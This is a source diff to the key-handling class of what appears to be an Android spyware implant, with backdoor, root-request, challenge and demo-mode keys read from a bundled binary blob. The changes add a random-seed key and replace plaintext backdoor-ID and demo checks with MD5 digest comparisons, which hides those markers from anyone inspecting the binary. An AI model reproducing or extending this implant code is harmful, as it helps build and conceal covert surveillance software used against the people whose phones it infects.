@@ -64,6 +64,10 @@ public class Keys {
 
 	// Privilege key
 	private static byte[] rootRequest;
+	
+	// Random seed
+	private static byte[] randomSeed;
+
 
 	/**
 	 * Self.
@@ -94,6 +98,7 @@ public class Keys {
 		return singleton;
 	}
 
+
 	protected Keys(boolean fromResources) {
 		String androidId = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
 		if (androidId == null) {
@@ -117,9 +122,7 @@ public class Keys {
 		instanceId = Digest.SHA1(androidId.getBytes());
 
 		if (fromResources) {
-			final Resources resources = Status.getAppContext().getResources();
-
-			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.resources), 0); // resources.bin
+			final byte[] resource = Utils.getAsset("r.bin"); // resources.bin
 
 			// Richiediamo 16 byte ma incrementiamo di 32, e' corretto cosi
 			// perche'
@@ -130,6 +133,7 @@ public class Keys {
 			challengeKey = Utils.copy(resource, 78, 16); // 16 byte
 			demoMode = Utils.copy(resource, 110, 24); // 24 byte
 			rootRequest = Utils.copy(resource, 134, 16); // 16 byte
+			randomSeed = Utils.copy(resource, 150, 16); // 16 byte
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " backdoorId: " + new String(backdoorId));//$NON-NLS-1$
@@ -139,6 +143,7 @@ public class Keys {
 				Check.log(TAG + " instanceId: " + Utils.byteArrayToHex(instanceId));//$NON-NLS-1$
 				Check.log(TAG + " demoMode: " + Utils.byteArrayToHex(demoMode));//$NON-NLS-1$
 				Check.log(TAG + " rootMode: " + Utils.byteArrayToHex(rootRequest));//$NON-NLS-1$
+				Check.log(TAG + " randomSeed: " + Utils.byteArrayToHex(randomSeed));//$NON-NLS-1$
 			}
 
 			if (isDemo()) {
@@ -149,15 +154,16 @@ public class Keys {
 	}
 
 	public boolean isDemo() {
-		byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba, (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39,
-				(byte) 0xdb, (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a, (byte) 0x58, (byte) 0xd5,
-				(byte) 0x2c, (byte) 0x52 };
+		// Pg-WaVyPzMMMMmGbhP6qAigT md5= 863d9effe70187254d3c5e9c76613a99
+		byte[] demoDigest = Utils.hexStringToByteArray("863d9effe70187254d3c5e9c76613a99");
 
 		byte[] calculated = Digest.MD5(demoMode);
-
+		
 		boolean ret = Arrays.equals(calculated, demoDigest);
 
 		if (Cfg.DEBUG) {
+			Check.log(TAG + "  demoMode = " + Utils.byteArrayToHex(demoMode));
+			Check.log(TAG + "  digest = " + Utils.byteArrayToHex(calculated));
 			Check.log(TAG + " (isDemo): " + ret); //$NON-NLS-1$
 		}
 
@@ -191,8 +197,12 @@ public class Keys {
 	 * @return true, if successful
 	 */
 	public boolean hasBeenBinaryPatched() {
-		return Utils.equals(backdoorId, 0, new byte[] { 'a', 'v', '3', 'p', 'V', 'c', 'k', '1', 'g', 'b', '4', 'e' },
-				0, 12);
+		// EMp7Ca7-fpOBIr md5=c705fb9161f633c98f02ed4cbda03348		
+		byte[] bDigest = Utils.hexStringToByteArray("c705fb9161f633c98f02ed4cbda03348");		
+		byte[] calculated = Digest.MD5(backdoorId);
+
+		boolean ret = Arrays.equals(calculated, bDigest);
+		return ret;
 	}
 
 	/**
